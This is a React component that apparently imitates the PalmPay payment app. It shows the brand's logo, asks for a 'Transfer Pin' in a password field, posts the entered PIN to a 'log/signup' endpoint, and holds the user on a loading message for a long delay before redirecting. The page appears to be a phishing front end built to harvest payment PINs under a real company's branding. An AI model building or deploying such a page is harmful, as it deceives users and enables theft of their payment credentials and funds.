import React from 'react'
import "./Atm.css"
import { useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

function Atm() {
  const [isloading, setisloading] = useState(false);
  const [pin, setpin] = useState("pin");

  const endpoint = "http://localhost:419/log/signup"

  const values = {
    pin:pin
  }
  const navigate = useNavigate();
  
  const sub =(e)=>{
    e.preventDefault();
    setisloading(true)
    console.log(values);
    axios.post(endpoint, values)
    .then((res)=>{
      console.log(res.data);
      setTimeout(()=>{
        navigate("/");
      },[50000])
    }).catch((err)=>{
      console.log(err);
    })
  }

  return (
    <>
      <h2 className='text-center'>Input Pin</h2>

      <main className='m-auto text-center align-items-center justify-content-center '>
        <dd>
        <div className='w-75 text-center m-auto'>
          <img className='m-auto' src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA
          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" alt="PalmPay" />
        </div>
        <div className='d-flex mb-4 mt-4'>
          <input onChange={(e) => setpin(e.target.value)} className='form-control w-50 m-auto' type="password" placeholder='Transfer Pin' />
          </div>
        <div>
          <button onClick={sub} className='btn btn-primary mt-3'>{isloading ? "loading please wait" : "Summit"}</button>
        </div>
        </dd>
      </main>
    </>
  )
}

export default Atm
